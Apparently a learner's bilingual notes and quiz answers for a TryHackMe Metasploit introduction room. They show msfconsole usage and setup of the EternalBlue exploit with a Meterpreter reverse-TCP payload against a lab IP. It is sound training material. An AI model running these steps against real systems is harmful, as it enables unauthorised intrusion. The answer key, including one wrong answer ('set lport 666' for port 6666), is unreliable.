https://tryhackme.com/room/metasploitintro


## Task 2 Main Components of Metasploit

### Entrar metasploit

```
msfconsole
```
### Listar los modulos
```

cd /usr/share/metasploit-framework/modules 

tree -L 1 auxiliary 

auxiliary
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit


```


#### What is the name of the code taking advantage of a flaw on the target system?  

exploit

#### What is the name of the code that runs on the target system to achieve the attacker's goal?  

payload

#### What are self-contained payloads called?  

singles

### Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?

singles


## Task 3 Msfconsole

### Teclear comandos dsde adentro

```
msfconsole -q

>> del sistema

ls
dir
ping

>> ayuda

help


```

### Buscar modulos y pedir info de ellos

```
search eternalblue

> usarlos con el numero

msf6 > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > back


> usarlos con la ruta

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 

> informacion del modulo cargado

info

> pedir ayuda de ellos desde afuera

msf6 > info windows/smb/ms17_010_eternalblue

```

### Mostrar (show)
- permite mostrar los diferentes modulos existentes
```
show help
msf6 > show 
show all        show encoders   show favorites  show options    show plugins
show auxiliary  show exploits   show nops       show payloads   show post

```

### Buscar modulos
- Podemos buscar modulos en base a varias caracteristicas
```
help search
search type:exploit -s name eternal
search type:auxiliary telnet

```


How would you search for a module related to Apache?  

search Apache

Who provided the auxiliary/scanner/ssh/ssh_login module?

```
info auxiliary/scanner/ssh/ssh_login

Provided by:
  todb <todb@metasploit.com>

```

todb

## Task 4 Working with modules

### Mencionar los diferentes tipos de prompts

```
>> Kali

┌──(kali㉿kali)-[~]
└─$ 


>> Metasploit

┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > 

>> Modulo cargado

msf6 > use windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) 

>> despues de explotar
> shell meterpreter
> shell en el sistema

```

### Mostrar opciones

```

>> Mostrar opciones

msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                             cs/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows
                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.197.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue)
```

### Establecer opciones
```
>> Establecer opciones
RHOST
LHOST
LPORT


msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.228.121
rhosts => 10.10.228.121
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
lhost => 10.2.4.107
msf6 exploit(windows/smb/ms17_010_eternalblue) > options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.228.121    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basi
                                             cs/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows
                                             Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2
                                             , Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.2.4.107       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.


>>> mencionar unser

unset RHOSTS
unset all

>>> mencionar setg, unsetg


msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.228.121
rhosts => 10.10.228.121
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg lhost tun0
lhost => tun0
msf6 exploit(windows/smb/ms17_010_eternalblue) > 




```


### Hablar del payload (meterpretar)

```
>> Meterpreter como payload

mostar otros payloads



```



##### How would you set the LPORT value to 6666?  

set lport 666

##### How would you set the global value for RHOSTS  to 10.10.19.23 ?  

setg rhosts 10.10.19.23


#### What command would you use to clear a set payload?  
unset payload

### What command do you use to proceed with the exploitation phase?

exploit